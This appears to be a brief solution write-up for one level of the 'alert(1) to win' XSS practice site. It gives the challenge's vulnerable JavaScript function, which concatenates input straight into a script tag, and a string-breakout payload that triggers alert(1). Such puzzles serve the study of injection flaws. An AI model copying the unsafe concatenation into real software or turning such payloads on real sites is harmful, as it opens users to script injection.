# alert(1)_to_win
```
Site link : http://escape.alf.nu/
```

##Vulnerbility Code
```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

##Payload
``` 
");alert(1,"
```
